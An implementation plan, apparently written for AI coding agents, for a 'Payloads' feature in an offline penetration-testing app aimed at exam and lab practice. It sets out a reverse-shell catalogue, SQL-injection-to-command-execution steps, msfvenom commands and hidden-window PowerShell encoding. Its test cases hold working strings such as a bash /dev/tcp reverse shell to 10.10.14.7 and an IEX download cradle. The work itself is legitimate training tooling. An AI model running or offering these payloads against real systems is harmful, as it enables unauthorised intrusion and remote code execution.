# 2b-B: Payloads Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A Payloads surface, separate from the Arsenal: a `P` drawer for quick use and a full-screen Workbench. It opens on the best-fit payload for the host and situation. Every payload works when pasted as-is in its stated context and explains each part. Generators: reverse shell, file transfer, SQL injection, msfvenom, PowerShell encoder and shell upgrade.

**Architecture:**
- **Content and logic.** Payload content is written in code under `src/engines/payloads/` as data plus pure builders: encoders, context wrapping, a fit ranker and per-generator catalogues. Exact-output tests prove every payload in every context.
- **UI.** `src/features/payloads/` hosts the drawer (mounted in `VaultGate` like `ArsenalDrawer`) and the Workbench route `/payloads`. It reuses the Arsenal's `HostChip`, `CredChip`, `useFillBase` and copy guard.
- **Failure memory.** Copy-and-log stamps the payload id on the log entry (new column), so later fit can mark "failed here before".

**Tech Stack:** React 19, TypeScript, zustand, TanStack Query, Tailwind 4, Vitest, Playwright audit; one Rust migration.

**Spec:** `docs/superpowers/specs/2026-11-07-raven-interpreters-and-payloads-design.md` (§4). Reference sketches: `.impeccable/mocks/decision/drawer.html` and `workbench.html`.

**Depends on:** plan 2b-A merged into the branch first (migration numbering: 2b-A uses 0011, this plan uses 0012).

## Global Constraints

- **Every payload works as pasted in its declared context** and has a "what each part does" list: one line per flag or part, including traps.
- **Context wrapping rules** (spec §4.3, from the owner's lab evidence):
  - **Linux, outside a real bash prompt:** wrap as `bash -c '…'`; in a URL, encode only `>` → `%3E` and `&` → `%26`, plus spaces.
  - **Linux fallback:** mkfifo plus nc, never `nc -e`.
  - **Reaped parent processes:** a backgrounded `( … ) &` variant.
  - **Windows default:** `powershell -nop -w hidden -e <UTF-16LE base64>`.
  - **SQL strings:** double the single quotes.
  - **URL contexts:** `-` → `%2d` where the lab needed it (the `nc.exe` flag through `xp_cmdshell` in a URL), and space → `+`.
- **Listener:** `penelope -O -p <port>` by default, with `rlwrap nc -lvnp <port>` as the fallback. Ports 443 and 80 are suggested first.
- **Exam rules:** never meterpreter; msfvenom offers stageless `shell_reverse_tcp` only.
- **Fit:**
  - best fit open;
  - other fits one key away (⇥);
  - known misfits folded behind "N don't fit here: show", each with its reason, never hidden;
  - every inferred value can be overridden, and the override sticks per host (zustand, persisted in memory for the session).
- **The Arsenal's rule is unchanged:** host is fill-only and never ranks. Payloads' ranking code must not be imported by `src/features/arsenal/**`.
- **Keys:**
  - `P` toggles the drawer from any unlocked screen (in the Workbench it focuses the generator list);
  - ↵ copies the payload; `⌥L` copies the listener; ⇥ next fit;
  - `⌥H`/`⌥C` open the host and credential pickers; ⌘↵ copies and logs;
  - generator switch: `⌥1`–`⌥6`.

  No single-letter key may shadow a global key (`L`, `N`, `A`, `H`, number keys, `j`/`k`/`c` stay card-only).
- **UI:** CSS grid with explicit tracks; Ink theme (one accent, amber `--warn`, no red); Instrument Sans for the interface, JetBrains Mono for payloads.
- **Offline,** with no network calls.

## Review Focus

1. **No LHOST set in Settings:** every payload shows an unfilled `{LHOST}` and the copy guard jumps to the field; nothing copies a payload with a blank IP silently. Test in Task 7.
2. **A host with OS unknown and no services:** fit falls back to asking for OS and paste context (both chips empty and amber) and still lists every payload as "fits" for both OSes. It never shows an empty drawer. Test in Task 3.
3. **LPORT changed after copying a payload file** (`rev.ps1`, exe): the stale warning appears on that payload. Test in Task 6.
4. **Long payloads** (the base64 PowerShell, about 1,300 chars) wrap inside the block in both the drawer and the Workbench, with no sideways scroll at 900, 1100, 1280 and 1440 wide. Test in Task 9.
5. **A SQL payload for a URL parameter** whose data contains `'` round-trips: quotes doubled inside the SQL string, then URL-encoded. Test in Task 4.

---

### Task 1: Encoders and context wrapping

**Files:**
- Create: `src/engines/payloads/encode.ts`, `src/engines/payloads/context.ts`, `src/test/engines/payloads/encode.test.ts`

**Interfaces:**
- `encode.ts`:
  - `utf16leBase64(script: string): string`;
  - `decodeUtf16leBase64(b64: string): string`;
  - `urlEncodeShell(s: string): string` (spaces → `+`, `&` → `%26`, `>` → `%3E`, `<` → `%3C`, `|` → `%7C`, `;` → `%3B`, `#` → `%23`, `'` → `%27`, `"` → `%22`, `-` left alone);
  - `urlEncodeFull(s: string): string` (`encodeURIComponent`);
  - `sqlQuote(s: string): string` (doubles `'`).
- `context.ts`:
  - `type PasteContext = 'bash-prompt' | 'injected-linux' | 'url-param' | 'php-system' | 'cmd' | 'powershell' | 'webshell-param' | 'sql-string' | 'macro'`;
  - `PASTE_CONTEXTS: { id: PasteContext; label: string; os: 'linux' | 'windows' | 'any' }[]`. Labels exact: "Bash prompt", "Injected command (Linux)", "URL / form parameter", "PHP system()", "cmd.exe", "PowerShell prompt", "Web shell ?cmd=", "Inside a SQL string", "Office macro".
  - `wrapForContext(cmd: string, ctx: PasteContext, os: 'linux' | 'windows'): { text: string; notes: string[] }`.

- [ ] **Step 1:** Write the tests, with the owner's lab cases as exact strings:
  - `utf16leBase64 round-trips` and `utf16leBase64('whoami') === 'dwBoAG8AYQBtAGkA'`;
  - `injected-linux wraps bash -c`: `wrapForContext("bash -i >& /dev/tcp/10.10.14.7/443 0>&1",'injected-linux','linux').text === "bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"`;
  - `url-param Postgres case encodes only > & and spaces inside bash -c`: the expected value ends `bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp…`. Derive the exact form from `urlEncodeShell` and assert that `>` and `&` never appear raw;
  - `sql-string doubles quotes`: `sqlQuote("IEX(New-Object Net.WebClient).DownloadString('http://x/rev.ps1')")` contains `''http://x/rev.ps1''`;
  - `webshell-param turns spaces into +`;
  - `bash-prompt leaves the command unchanged`.
- [ ] **Step 2:** Run `npx vitest run src/test/engines/payloads`. Expected: FAIL.
- [ ] **Step 3:** Implement both files.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): encoders and paste-context wrapping`.

### Task 2: Payload model and reverse-shell catalogue

**Files:**
- Create: `src/engines/payloads/types.ts`, `src/engines/payloads/reverseShells.ts`, `src/engines/payloads/build.ts`, `src/test/engines/payloads/reverseShells.test.ts`

**Interfaces:**
- `types.ts`:

  ```ts
  export type GeneratorId = 'shell' | 'transfer' | 'sql' | 'msfvenom' | 'encode' | 'upgrade';
  export interface PayloadPart { token: string; explain: string }       // token as it appears in the output
  export interface PayloadDef {
    id: string; generator: GeneratorId; title: string; os: 'linux' | 'windows';
    contexts: PasteContext[];                 // where it works as pasted (after wrapping)
    requires: ('nc' | 'nc-e' | 'python3' | 'powershell' | 'bash' | 'php' | 'served-file')[];
    template: string;                          // {LHOST} {LPORT} {FILE} … placeholders
    parts: PayloadPart[];
    listener: 'penelope' | 'none';
    bakesIp?: boolean;                          // a file or script with LHOST inside (stale warning)
    background?: boolean;                       // the ( … ) & variant
    serve?: string;                             // command to serve a hosted script, e.g. "python3 -m http.server 80"
  }
  export interface BuiltPayload { def: PayloadDef; text: string; listener: string | null; parts: PayloadPart[]; notes: string[]; unresolved: string[] }
  ```

- `build.ts`: `buildPayload(def, ctx: PasteContext, values: Record<string, string>): BuiltPayload`. It fills the placeholders and wraps the result for the context (Task 1). For the Windows PowerShell shell it builds the TCPClient script, then `utf16leBase64`, then `powershell -nop -w hidden -e <b64>`. The listener is `penelope -O -p ${LPORT}`.
- `reverseShells.ts`: `REVERSE_SHELLS: PayloadDef[]`, written from the Field Manual card `Field-Manual/02-Cards/Shells-and-Transfers/Reverse-Shells.md` (read it for templates and the symptom table). At least:
  - Linux:
    - `bash-tcp` (bash `/dev/tcp`, contexts bash-prompt, injected-linux, url-param, php-system);
    - `mkfifo-nc`;
    - `mkfifo-nc-bg` (`background: true`);
    - `python3`;
    - `php-exec`.
  - Windows:
    - `ps-b64` (contexts cmd, powershell, webshell-param, url-param, macro);
    - `powercat-cradle` (`serve`);
    - `nishang-cradle` (`serve`, sql-string);
    - `nc-exe` (`requires: ['nc-e']`, with the note "Needs an nc.exe built with -e; if it returns instantly, the build has no -e").
  - Every `parts` entry is non-empty.

- [ ] **Step 1:** Write the tests:
  - `every REVERSE_SHELLS def has parts covering each flag in its template`: every `-x` or `--xx` token in the built text for each context has a `PayloadPart` whose `token` contains it;
  - `bash-tcp in injected-linux is bash -c wrapped`;
  - `no Linux def uses nc -e`;
  - `ps-b64 decodes to a TCPClient script with the given LHOST and LPORT`;
  - `nishang-cradle in sql-string has doubled quotes`;
  - `listener is penelope -O -p 443 for LPORT 443`;
  - `unresolved lists LHOST when it is blank` (Review Focus 1, engine side).
- [ ] **Step 2:** Run the tests. Expected: FAIL.
- [ ] **Step 3:** Implement the model, catalogue and builder.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): reverse-shell catalogue that works as pasted`.

### Task 3: Fit engine

**Files:**
- Create: `src/engines/payloads/fit.ts`, `src/test/engines/payloads/fit.test.ts`

**Interfaces:**
- `PayloadSituation = { os: 'linux' | 'windows' | null; services: { port: number; name: string; product: string }[]; prompt: 'ps' | 'cmd' | 'sh' | null; webShellUrl: string | null; tools: { present: string[]; absent: string[] }; failedPayloadIds: string[]; exam: boolean; dbEngine: 'mssql' | 'mysql' | 'postgres' | 'oracle' | 'sqlite' | null }`.
- `inferSituation(input: { host: Host | null; services: Service[]; entries: LogEntry[]; examKind: boolean }): { situation: PayloadSituation; evidence: Partial<Record<keyof PayloadSituation, string>> }`. `tools` come only from output that proves them: linPEAS's "Useful software" section lines and `which <tool>` output (path means present, empty means absent). Command text never counts. Evidence strings are exact phrasing like `from nmap (IIS 10.0 on 80)` or `from your 14:02 log entry`.
- `inferContext(s: PayloadSituation): PasteContext | null`:
  - `prompt 'ps'` → powershell; `'cmd'` → cmd; `'sh'` → bash-prompt;
  - `webShellUrl` → webshell-param;
  - else null.
- `rankPayloads(defs: PayloadDef[], s: PayloadSituation, ctx: PasteContext | null): { fits: PayloadDef[]; misfits: { def: PayloadDef; reason: string }[] }`.
  - **Misfit reasons** (exact):
    - `Wrong OS (${os})`;
    - `Doesn't work in ${contextLabel}`;
    - `Needs ${tool}, which isn't on this box`;
    - `Failed here before`;
    - `Not allowed in the exam`.
  - **Order of fits:** first, payloads whose `contexts` include `ctx`; then ones that need no tools absent from the box; then catalogue order.
  - With `os` null, both OSes fit (Review Focus 2).

- [ ] **Step 1:** Write the tests:
  - `IIS + logged ?cmd= URL infers windows + webshell-param, best fit ps-b64`;
  - `a logged nc.exe payload marked failed folds nc-exe with 'Failed here before'`;
  - `absent python3 folds python3`;
  - `os null lists both OSes as fits and context null`;
  - `prompt 'PS C:\\>' in the latest output infers powershell`.
- [ ] **Step 2:** Run the tests. Expected: FAIL.
- [ ] **Step 3:** Implement the fit engine.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): situation inference and fit ranking`.

### Task 4: SQL injection generator

**Files:**
- Create: `src/engines/payloads/sql.ts`, `src/test/engines/payloads/sql.test.ts`

**Interfaces:**
- `SQL_ENGINES = ['mssql','mysql','postgres','oracle','sqlite'] as const`.
- `type SqlPoint = 'url-param' | 'form-field' | 'client-session'`. A client session gets no injection prefix, quote break or encoding.
- `SQL_STEPS`, in walkthrough order, each with `id`, `title` and `explain`:
  1. `detect-error`
  2. `detect-boolean`
  3. `detect-time`
  4. `column-count`
  5. `reflected-columns`
  6. `version`
  7. `databases`
  8. `tables`
  9. `columns`
  10. `rows`
- `SQL_EXEC`: `mssql-enable-xp_cmdshell`, `mssql-xp_cmdshell`, `postgres-copy-program`, `mysql-into-outfile-webshell`, `mysql-load-file`, `mssql-read-file` (only those that apply per engine).
- `buildSql(stepOrExecId: string, engine, point: SqlPoint, values: { prefix?: string; columns?: number; reflected?: number; table?: string; column?: string; cmd?: string; path?: string; LHOST?: string; LPORT?: string }): BuiltPayload`. Its `parts` explain every SQL element (`UNION`, `NULL`, `--`/`#`, `ORDER BY n`, `WAITFOR DELAY`/`SLEEP`/`pg_sleep`, string joining, `information_schema`). Engine syntax table:

  | | comment | sleep | version | joining strings |
  |---|---|---|---|---|
  | MSSQL | `-- -` | `WAITFOR DELAY '0:0:5'` | `@@version` | `+` |
  | MySQL | `-- -` / `#` | `SLEEP(5)` | `@@version` | `CONCAT()` |
  | Postgres | `-- -` | `pg_sleep(5)` | `version()` | `\|\|` |
  | Oracle | `-- -` | `dbms_pipe.receive_message('a',5)` | `banner FROM v$version` | `\|\|` |
  | SQLite | `-- -` | none (heavy query) | `sqlite_version()` | `\|\|` |

  Oracle's `UNION` needs `FROM dual`. A shell from SQL reuses Task 2 (`postgres-copy-program` embeds `bash-tcp` wrapped `bash -c` with `%3E%26` when `url-param`, as in the lab; `mssql-xp_cmdshell` embeds `ps-b64` or the Nishang cradle with quotes doubled).
- Sources: the Field Manual cards `02-Cards/Web/SQL-Injection.md`, `MSSQL-Error-Based-SQLi.md` and `SQLi-to-Code-Execution.md`, and the Module 10 labs in the PEN-200 vault.

- [ ] **Step 1:** Write the tests:
  - `column-count for mysql url-param is ' ORDER BY 1-- - encoded`;
  - `time detect uses the engine's sleep`;
  - `oracle UNION includes FROM dual`;
  - `postgres-copy-program in url-param matches the lab form`: contains `COPY`, `FROM PROGRAM`, `bash+-c` and `%3E%26`, never a raw `>&`;
  - `mssql-xp_cmdshell with the nishang cradle doubles quotes` (Review Focus 5);
  - `client-session payloads have no leading quote and no encoding`;
  - `every step and exec id has parts explaining each SQL keyword it uses`.
- [ ] **Step 2:** Run the tests. Expected: FAIL.
- [ ] **Step 3:** Implement the generator.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): SQL injection walkthrough, exec and engine syntax`.

### Task 5: msfvenom, PowerShell encoder and shell upgrade

**Files:**
- Create: `src/engines/payloads/{msfvenom,encodePs,upgrade}.ts`, `src/test/engines/payloads/others.test.ts`

**Interfaces:**
- `MSFVENOM: PayloadDef[]`, stageless only:
  - `windows/x64/shell_reverse_tcp` as `exe`, `dll` and `hta-psh`;
  - `windows/shell_reverse_tcp` (x86) as `exe`, with the note "x86 for Veil/Shellter";
  - `linux/x64/shell_reverse_tcp` as `elf`;
  - `windows/x64/shell_reverse_tcp` as `aspx`;
  - `java/jsp_shell_reverse_tcp` as `war`.

  Each has `bakesIp: true`. Format: `msfvenom -p <payload> LHOST={LHOST} LPORT={LPORT} -f <fmt> -o <file>`, with parts for `-p`, `LHOST`, `LPORT`, `-f` and `-o`. Listener: penelope (and the note "or nc; no multi/handler needed for stageless shell").
- `encodePs(command: string): BuiltPayload` gives `powershell -nop -w hidden -e <b64>`, with `notes: ['Decodes to: <command>']`.
- `UPGRADE: PayloadDef[]`:
  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`;
  - `script -qc /bin/bash /dev/null`;
  - the steps `Ctrl-Z`, `stty raw -echo; fg`, `export TERM=xterm-256color`, `stty rows <r> cols <c>`;
  - `export HOME=/home/<user>` with the note "when the shell inherited root's HOME";
  - a note that penelope upgrades on its own.

- [ ] **Step 1:** Write the tests:
  - `no MSFVENOM def contains meterpreter or a staged path (/shell/reverse)`;
  - `encodePs round-trips`;
  - `upgrade steps are in order`.
- [ ] **Step 2:** Run the tests. Expected: FAIL.
- [ ] **Step 3:** Implement the three files.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): msfvenom, encoder and upgrade`.

### Task 6: Payload id on log entries, failure memory and stale-IP warning

**Files:**
- Create: `src-tauri/migrations/0012_log_payload.sql` (`ALTER TABLE log_entries ADD COLUMN payload_id TEXT;`, plus `ALTER TABLE log_entries ADD COLUMN payload_values TEXT;` for the JSON of the `LHOST`/`LPORT` used)
- Modify:
  - `src-tauri/src/migrations/mod.rs` and `src-tauri/src/log.rs` (round-trip both fields);
  - `src/types/log.ts` (`payloadId?: string | null; payloadValues?: Record<string, string> | null`);
  - `src/lib/api.ts`;
  - `src/features/capture/logCommand.ts` (optional `payloadId` and `payloadValues` args).
- Create: `src/engines/payloads/memory.ts`, `src/test/engines/payloads/memory.test.ts`

**Interfaces:**
- `failedPayloadIds(entries: LogEntry[], hostId: string): string[]`. An entry with `payloadId` on that host counts as failed when `returnedNothing` is true, or when its output matches `/not recognized|invalid option|cannot find|Access is denied|command not found/i`.
- `staleBaked(entries: LogEntry[], current: { LHOST: string; LPORT: string }): { payloadId: string; at: number; was: string }[]`. These are entries whose `def.bakesIp` payload was generated with different values.

- [ ] **Step 1:** Write the Rust test `migrates_11_to_12_keeps_rows` and `log round-trips payload_id`.
- [ ] **Step 2:** Write the TS tests:
  - `returnedNothing marks failed`;
  - `nc -e invalid option output marks failed`;
  - `changed LPORT lists the rev.ps1 entry as stale` (Review Focus 3).
- [ ] **Step 3:** Run all of them. Expected: FAIL.
- [ ] **Step 4:** Implement.
- [ ] **Step 5:** Run `cargo test && npx vitest run src/test/engines/payloads`. Expected: PASS.
- [ ] **Step 6:** Commit: `feat(payloads): remember payload outcomes per host`.

### Task 7: Payloads store, the shared view and the drawer (`P`)

**Files:**
- Create:
  - `src/features/payloads/usePayloadsStore.ts`;
  - `src/features/payloads/PayloadView.tsx`: the shared body of best fit, listener, payload, parts, also-fits and the misfit fold;
  - `src/features/payloads/ContextChips.tsx`;
  - `src/features/payloads/PayloadsDrawer.tsx`;
  - `src/test/features/payloads/drawer.test.tsx`.
- Modify:
  - `src/features/vault/VaultGate.tsx` (mount `<PayloadsDrawer />`, and add a `TitleBarButton hint="P"` labelled "Payloads" after Arsenal);
  - `src/features/arsenal/useArsenalStore.ts` (opening Payloads closes the Arsenal drawer and vice versa, as Notes does).

**Interfaces:**
- **Store:** `{ open: boolean; generator: GeneratorId; overrides: Record<hostId, { os?; context?; port? }>; toggle(); close(); setGenerator(g); override(hostId, patch) }`.
- **Drawer:** a 560px right drawer with the same chrome as `ArsenalDrawer`.
  - Rows, top to bottom: generator tabs; context chips (host via `HostChip`, OS, "where you paste it", port), each with its evidence line; the scrolling body `PayloadView`; the hint line.
  - Hint line, exact: `↵ copy payload · ⌥L copy listener · ⇥ next fit · ⌥1-6 generator · ⌘↵ copy and log · Esc close`.
  - Full-screen button → `navigate('/payloads')`.
- **Copy:** through `useCopyGuard`. A payload with an unresolved `{LHOST}` focuses the LHOST field (Review Focus 1). ⌘↵ calls `logCommand` with `payloadId` and `payloadValues`.
- **Stale IP:** a `bakesIp` payload listed by `staleBaked` (Task 6) shows an amber line `Built at ${time} with ${was}; rebuild it` above the copy block.
- **Layout:** the drawer uses a fixed body split (as the Arsenal drawer after its layout fix). The payload `pre` has `max-h-48` and scrolls inside.

- [ ] **Step 1:** Write the tests:
  - `P toggles the drawer and A closes it`;
  - `opens on the best fit for an IIS host with a logged ?cmd= entry`;
  - `↵ copies the payload, ⌥L copies the listener`;
  - `blank LHOST: ↵ focuses the LHOST field and copies nothing` (sentinel clipboard);
  - `⇥ moves to the next fit`;
  - `misfit fold shows 'N don't fit here' and expands with reasons`;
  - `overriding the paste context sticks for that host`.
- [ ] **Step 2:** Run the tests. Expected: FAIL.
- [ ] **Step 3:** Implement the store, view, chips and drawer.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): P drawer`.

### Task 8: Workbench, and moving Transfer from the Arsenal

**Files:**
- Create:
  - `src/features/payloads/PayloadsWorkbench.tsx`;
  - `src/features/payloads/TransferPanel.tsx` (wraps the existing `TransferGenerator` logic for Payloads);
  - `src/features/payloads/SqlPanel.tsx` (the walkthrough as a numbered step list with engine and injection-point pickers, and exec payloads below);
  - `src/test/features/payloads/workbench.test.tsx`.
- Modify:
  - `src/App.tsx` (add `<Route path="payloads" element={<PayloadsWorkbench />} />`);
  - `src/features/arsenal/ArsenalBrowse.tsx` and `src/features/palette/generators.ts`: the Arsenal's "Transfer a file" generator entry becomes a link that opens Payloads on Transfer. `navigate('/payloads?generator=transfer')` from browse; `usePayloadsStore` `open` plus `setGenerator('transfer')` from the drawer and ⌘K.

**Interfaces:**
- **Workbench** grid: `grid-cols-[360px_minmax(0,1fr)]`.
  - **Left column, "Raven's read":**
    - target `HostChip`;
    - OS with evidence;
    - "Where you paste it" as a 2-column grid of buttons from `PASTE_CONTEXTS` filtered by OS;
    - LHOST/LPORT inputs (seeded from Settings, editable, overrides per host);
    - an exam rules line;
    - the generator list.
  - **Right column:** `PayloadView` with numbered steps ("1 · Listener on Kali", "2 · Paste into <context label>"), then "What each part does", then the misfit fold.
  - `Esc` returns to the previous route, as `ArsenalBrowse` does.
- **SQL panel** (drawer and Workbench): engine picker (inferred), injection point picker, and the steps as a vertical list. Each step has its payload, parts and a copy button; values like the column count carry forward from earlier steps' inputs.

- [ ] **Step 1:** Write the tests:
  - `/payloads renders Raven's read with evidence and the best fit`;
  - `clicking 'Inside a SQL string' re-wraps the payload`;
  - `Transfer from the Arsenal opens Payloads on Transfer`;
  - `SQL panel picks postgres from port 5432 and lists the 10 steps in order`;
  - `Esc leaves the Workbench`.
- [ ] **Step 2:** Run the tests. Expected: FAIL.
- [ ] **Step 3:** Implement the Workbench and panels.
- [ ] **Step 4:** Run the tests. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(payloads): Workbench, SQL panel and Transfer moved from the Arsenal`.

### Task 9: Audit coverage and full verification

**Files:**
- Modify: `src/audit/fixtures.ts` (an IIS host with a `?cmd=` log entry, a Postgres host, a failed `nc.exe` entry), `src/audit/fakeApi.ts`, `audit/screens.ts` (add the drawer and `/payloads`), `audit/regressions.spec.ts`

- [ ] **Step 1:** Add regression tests:
  - `payloads drawer and workbench: no pane scrolls sideways or clips focus`, using the existing `ARSENAL_PANES` check at 900, 1100, 1280 and 1440 (Review Focus 4);
  - `long ps-b64 payload wraps inside its block`;
  - `P opens on the best fit for the IIS host and ↵ copies it` (clipboard);
  - `the misfit fold lists nc.exe as failed here before`.
- [ ] **Step 2:** Run `npm run audit:visual`. Expected: all pass.
- [ ] **Step 3:** Run `npx tsc -b && npx eslint . && npx vitest run && (cd src-tauri && cargo test)`. Expected: all pass.
- [ ] **Step 4:** Commit: `test(audit): Payloads`.
